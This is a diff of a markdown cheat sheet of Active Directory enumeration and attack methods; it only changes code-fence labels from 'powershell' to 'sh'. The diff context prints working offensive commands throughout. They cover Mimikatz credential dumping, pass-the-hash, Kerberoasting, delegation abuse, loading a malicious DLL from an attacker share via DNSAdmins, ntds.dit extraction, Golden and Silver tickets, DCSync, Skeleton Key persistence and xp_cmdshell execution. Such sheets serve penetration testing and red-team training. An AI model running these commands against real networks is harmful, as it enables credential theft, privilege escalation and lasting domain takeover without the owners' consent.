@@ -99,7 +99,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 - **Get Domain SID:** `Get-DomainSID`
 - **Get Domain Policy:**
 
-  ```powershell
+  ```sh
   Get-DomainPolicy
 
   #Will show us the policy configurations of the Domain about system access or kerberos
@@ -108,13 +108,13 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
   ```
 
 - **Get Domain Controllers:**
-  ```powershell
+  ```sh
   Get-DomainController
   Get-DomainController -Domain <DomainName>
   ```
 - **Enumerate Domain Users:**
 
-  ```powershell
+  ```sh
   #Save all Domain Users to a file
   Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
 
@@ -133,7 +133,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **Enum Domain Computers:**
 
-  ```powershell
+  ```sh
   Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
 
   #Enumerate Live machines
@@ -142,7 +142,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **Enum Groups and Group Members:**
 
-  ```powershell
+  ```sh
   #Save all Domain Groups to a file:
   Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
 
@@ -162,7 +162,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **Enumerate Shares:**
 
-  ```powershell
+  ```sh
   #Enumerate Domain Shares
   Find-DomainShare
 
@@ -175,7 +175,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **Enum Group Policies:**
 
-  ```powershell
+  ```sh
   Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
 
   #Enumerate all GPOs to a specific computer
@@ -186,12 +186,12 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
   ```
 
 - **Enum OUs:**
-  ```powershell
+  ```sh
   Get-DomainOU -Properties Name | Sort-Object -Property Name
   ```
 - **Enum ACLs:**
 
-  ```powershell
+  ```sh
   # Returns the ACLs associated with the specified account
   Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs
 
@@ -204,7 +204,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **Enum Domain Trust:**
 
-  ```powershell
+  ```sh
   Get-DomainTrust
   Get-DomainTrust -Domain <DomainName>
 
@@ -214,7 +214,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **Enum Forest Trust:**
 
-  ```powershell
+  ```sh
   Get-ForestDomain
   Get-ForestDomain -Forest <ForestName>
 
@@ -225,7 +225,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **User Hunting:**
 
-  ```powershell
+  ```sh
   #Finds all machines on the current domain where the current user has local admin access
   Find-LocalAdminAccess -Verbose
 
@@ -249,14 +249,14 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 - **Get Domain SID:** `Get-DomainSID`
 - **Get Domain Controlers:**
 
-  ```powershell
+  ```sh
   Get-ADDomainController
   Get-ADDomainController -Identity <DomainName>
   ```
 
 - **Enumerate Domain Users:**
 
-  ```powershell
+  ```sh
   Get-ADUser -Filter * -Identity <user> -Properties *
 
   #Get a specific "string" on a user's attribute
@@ -264,18 +264,18 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
   ```
 
 - **Enum Domain Computers:**
-  ```powershell
+  ```sh
   Get-ADComputer -Filter * -Properties *
   Get-ADGroup -Filter *
   ```
 - **Enum Domain Trust:**
-  ```powershell
+  ```sh
   Get-ADTrust -Filter *
   Get-ADTrust -Identity <DomainName>
   ```
 - **Enum Forest Trust:**
 
-  ```powershell
+  ```sh
   Get-ADForest
   Get-ADForest -Identity <ForestName>
 
@@ -285,7 +285,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 - **Enum Local AppLocker Effective Policy:**
 
-  ```powershell
+  ```sh
   Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   ```
 
@@ -295,13 +295,13 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 
 [Python BloodHound Repository](https://github.com/fox-it/BloodHound.py) or install it with `pip3 install bloodhound`
 
-```powershell
+```sh
 bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
 ```
 
 #### On Site BloodHound
 
-```powershell
+```sh
 #Using exe ingestor
 .\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>
 
@@ -351,7 +351,7 @@ You can export enumerated objects from any module/cmdlet into an XML file for la
 
 The `Export-Clixml` cmdlet creates a Common Language Infrastructure (CLI) XML-based representation of an object or objects and stores it in a file. You can then use the `Import-Clixml` cmdlet to recreate the saved object based on the contents of that file.
 
-```powershell
+```sh
 # Export Domain users to xml file.
 Get-DomainUser | Export-CliXml .\DomainUsers.xml
 
@@ -408,7 +408,7 @@ $DomainUsers | ? {$_.name -match "User's Name"}
 
 ### PowerShell Remoting
 
-```powershell
+```sh
 #Enable PowerShell Remoting on current Machine (Needs Admin Access)
 Enable-PSRemoting
 
@@ -419,7 +419,7 @@ Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
 
 ### Remote Code Execution with PS Credentials
 
-```powershell
+```sh
 $SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
 Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
@@ -427,7 +427,7 @@ Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoa
 
 ### Import a PowerShell Module and Execute its Functions Remotely
 
-```powershell
+```sh
 #Execute the command and start a session
 Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
 
@@ -438,7 +438,7 @@ Enter-PSSession -Session $sess
 
 ### Executing Remote Stateful commands
 
-```powershell
+```sh
 #Create a new session
 $sess = New-PSSession -ComputerName <NameOfComputer>
 
@@ -451,7 +451,7 @@ Invoke-Command -Session $sess -ScriptBlock {$ps}
 
 ### Mimikatz
 
-```powershell
+```sh
 #The commands are in cobalt strike format!
 
 #Dump LSASS:
@@ -512,7 +512,7 @@ mimikatz vault::list
 
 - LSA as a Protected Process (Kernel Land Bypass)
 
-  ```powershell
+  ```sh
   #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
   reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 
@@ -534,7 +534,7 @@ mimikatz vault::list
 
 - LSA is running as virtualized process (LSAISO) by Credential Guard
 
-  ```powershell
+  ```sh
   #Check if a process called lsaiso.exe exists on the running processes
   tasklist |findstr lsaiso
 
@@ -554,7 +554,7 @@ If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pas
 
 - Mimikatz:
 
-  ```powershell
+  ```sh
   #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
   privilege::debug
   sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
@@ -564,7 +564,7 @@ If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pas
 
 - xFreeRDP:
 
-```powershell
+```sh
 xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
 ```
 
@@ -574,13 +574,13 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
 
 On a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:
 
-```powershell
+```sh
 REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
 ```
 
 Once you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.
 
-```powershell
+```sh
 REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
 ```
 
@@ -634,7 +634,7 @@ _WUT IS DIS?:_ \
 
 - PowerView:
 
-  ```powershell
+  ```sh
   #Get User Accounts that are used as Service Accounts
   Get-NetUser -SPN
 
@@ -650,20 +650,20 @@ _WUT IS DIS?:_ \
 
 - AD Module:
 
-  ```powershell
+  ```sh
   #Get User Accounts that are used as Service Accounts
   Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
   ```
 
 - Impacket:
 
-  ```powershell
+  ```sh
   python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
   ```
 
 - Rubeus:
 
-  ```powershell
+  ```sh
   #Kerberoasting and outputing on a file with a specific format
   Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
 
@@ -696,7 +696,7 @@ Check for interesting permissions on accounts:
 
 PowerView:
 
-```powershell
+```sh
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 Disable Kerberos Preauth:
 Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
@@ -706,7 +706,7 @@ Get-DomainUser -PreauthNotRequired -Verbose
 
 - And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.
 
-  ```powershell
+  ```sh
   #Get a specific Accounts hash:
   Get-ASREPHash -UserName <UserName> -Verbose
 
@@ -716,7 +716,7 @@ Get-DomainUser -PreauthNotRequired -Verbose
 
 - Using Rubeus:
 
-  ```powershell
+  ```sh
   #Trying the attack for all domain users
   Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
 
@@ -729,7 +729,7 @@ Get-DomainUser -PreauthNotRequired -Verbose
 
 - Using Impacket:
 
-  ```powershell
+  ```sh
   #Trying the attack for the specified users on the file
   python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
   ```
@@ -753,7 +753,7 @@ If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a t
 
 - PowerView:
 
-  ```powershell
+  ```sh
   #Check for interesting permissions on accounts:
   Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 
@@ -766,7 +766,7 @@ If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a t
 
 - AD Module:
 
-  ```powershell
+  ```sh
   #Check if current user has already an SPN setted
   Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
 
@@ -780,7 +780,7 @@ Finally use any tool from before to grab the hash and kerberoast it!
 
 If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.
 
-```powershell
+```sh
 #List shadow copies using vssadmin (Needs Admnistrator Access)
 vssadmin list shadows
 
@@ -802,7 +802,7 @@ Usually encrypted credentials are stored in:
 - `%appdata%\Microsoft\Credentials`
 - `%localappdata%\Microsoft\Credentials`
 
-```powershell
+```sh
 #By using the cred function of mimikatz we can enumerate the cred object and get information about it:
 dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
 
@@ -830,7 +830,7 @@ high value target or DA to connect to it, steal his TGT then ptt and impersonate
 
 Using PowerView:
 
-```powershell
+```sh
 #Discover domain joined computers that have Unconstrained Delegation enabled
 Get-NetComputer -UnConstrained
 
@@ -854,7 +854,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
 
 Using PowerView and Kekeo:
 
-```powershell
+```sh
 #Enumerate Users and Computers with constrained delegation
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
@@ -872,7 +872,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
 _ALTERNATIVE:_
 Using Rubeus:
 
-```powershell
+```sh
 Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
 ```
 
@@ -899,7 +899,7 @@ If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.
 
 Exploitation Example:
 
-```powershell
+```sh
 #Import Powermad and use it to create a new MACHINE ACCOUNT
 . .\Powermad.ps1
 New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
@@ -933,7 +933,7 @@ Detailed Articles:
 
 :exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
 
-```powershell
+```sh
 #Command on Rubeus
 Rubeus.exe tgtdeleg /nowrap
 ```
@@ -951,7 +951,7 @@ _WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly loa
 2. Once we found a member of this group we need to compromise it (There are many ways).
 3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:
 
-   ```powershell
+   ```sh
    #Using dnscmd:
    dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
 
@@ -974,7 +974,7 @@ extract the ntds.dit database file, dump the hashes and escalate our privileges 
 
 1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:
 
-   ```powershell
+   ```sh
    #Create a .txt file that will contain the shadow copy process script
    Script ->{
    set context persistent nowriters
@@ -997,7 +997,7 @@ extract the ntds.dit database file, dump the hashes and escalate our privileges 
    simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
    going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:
 
-   ```powershell
+   ```sh
    #Importing both dlls from the repo using powershell
    Import-Module .\SeBackupPrivilegeCmdLets.dll
    Import-Module .\SeBackupPrivilegeUtils.dll
@@ -1047,7 +1047,7 @@ _WUT IS DIS?: If we manage to compromise a child domain of a forest and [SID fil
 
 Exploitation example:
 
-```powershell
+```sh
 #Get the SID of the Current Domain using PowerView
 Get-DomainSID -Domain current.root.domain.local
 
@@ -1102,7 +1102,7 @@ Detailed Articles:
 
 _Note: Certify can be executed with Cobalt Strike's `execute-assembly` command as well_
 
-```powershell
+```sh
 .\Certify.exe find /vulnerable /quiet
 ```
 
@@ -1116,7 +1116,7 @@ _Note: If a Domain Admin is in a Protected Users group, the exploit may not work
 
 Request the DA's Account Certificate with Certify
 
-```powershell
+```sh
 .\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
 ```
 
@@ -1152,7 +1152,7 @@ Once the `cert.pfx` file has been exported, upload it to the compromised host (t
 
 After the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.
 
-```powershell
+```sh
 .\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
 ```
 
@@ -1170,7 +1170,7 @@ This should result in a successfully imported ticket, which then enables an atta
 
 ### Golden Ticket Attack
 
-```powershell
+```sh
 #Execute mimikatz on DC as DA to grab krbtgt hash:
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>
 
@@ -1181,7 +1181,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainN
 
 ### DCsync Attack
 
-```powershell
+```sh
 #DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
 
@@ -1198,7 +1198,7 @@ secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
 
 ### Silver Ticket Attack
 
-```powershell
+```sh
 Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
 <ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
 ```
@@ -1207,7 +1207,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID
 
 ### Skeleton Key Attack
 
-```powershell
+```sh
 #Exploitation Command runned as DA:
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>
 
@@ -1219,7 +1219,7 @@ Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administr
 
 _WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_
 
-```powershell
+```sh
 #Dump DSRM password (needs DA privs):
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>
 
@@ -1243,7 +1243,7 @@ _WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimili
 
 From powershell:
 
-```powershell
+```sh
 #Get current Security Package:
 $packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'
 
@@ -1270,7 +1270,7 @@ _WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional
 
 - Using Mimikatz:
 
-  ```powershell
+  ```sh
   #Dump the trust key
   Invoke-Mimikatz -Command '"lsadump::trust /patch"'
   Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
@@ -1287,7 +1287,7 @@ _WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional
 
 - Using Rubeus:
 
-  ```powershell
+  ```sh
   .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
   ```
 
@@ -1296,7 +1296,7 @@ _WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional
 - Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
 - Check Accessibility as current user:
 
-  ```powershell
+  ```sh
   Get-SQLConnectionTestThreaded
   Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
   ```
@@ -1307,7 +1307,7 @@ _WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional
 
 Check for existing Database Links:
 
-```powershell
+```sh
 #Check for existing Database Links:
 #PowerUpSQL:
 Get-SQLServerLink -Instance <SPN> -Verbose
@@ -1318,7 +1318,7 @@ select * from master..sysservers
 
 Then we can use queries to enumerate other links from the linked Database:
 
-```powershell
+```sh
 #Manualy:
 select * from openquery("LinkedDatabase", 'select * from master..sysservers')
 
@@ -1332,7 +1332,7 @@ EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
 
 Query execution:
 
-```powershell
+```sh
 Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
 ```
 
@@ -1350,7 +1350,7 @@ Tools we are going to use:
 
 Exploitation example:
 
-```powershell
+```sh
 #Start monitoring for TGTs with rubeus:
 Rubeus.exe monitor /interval:5 /filteruser:target-dc
 
